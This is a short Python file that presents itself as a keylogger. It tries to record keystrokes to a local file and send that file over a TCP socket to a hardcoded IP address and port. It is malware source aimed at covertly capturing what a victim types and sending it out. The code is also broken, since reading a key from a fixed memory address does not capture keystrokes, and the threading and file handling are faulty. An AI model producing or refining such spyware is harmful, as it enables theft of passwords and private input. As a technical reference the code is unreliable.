import ctypes
import socket
import os
import sys
from threading import Thread

class KeyLogger:
    def __init__(self):
        self.log_file = open("keylogs.txt", "w+b")
        self.server_ip = '192.168.122.182'
        self.server_port = 9000
        self.exit_flag = False

    def keylogger(self):
        while not self.exit_flag:
            try:
                key = ctypes.c_char_p.from_address(0x4A3).value[0]
                print('Key pressed:', key)
                self.log_file.write(str(key))
            except KeyboardInterrupt:
                self.exit_flag = True
        self.log_file.close()

    def send_logs(self):
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((self.server_ip, self.server_port))
            with open('keylogs.txt', 'r') as file:
                data = file.read()
                client_socket.send(data.encode())
        except Exception as e:
            print('Error:', str(e))
        finally:
            client_socket.close()

    def start(self):
        logging_thread = Thread(target=self.keylogger)
        sending_thread = Thread(target=self.send_logs)
        try:
            logging_thread.start()
            sending_thread.start()
        except Exception as e:
            print('Error:', str(e))
        finally:
            sys.exit(0)

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()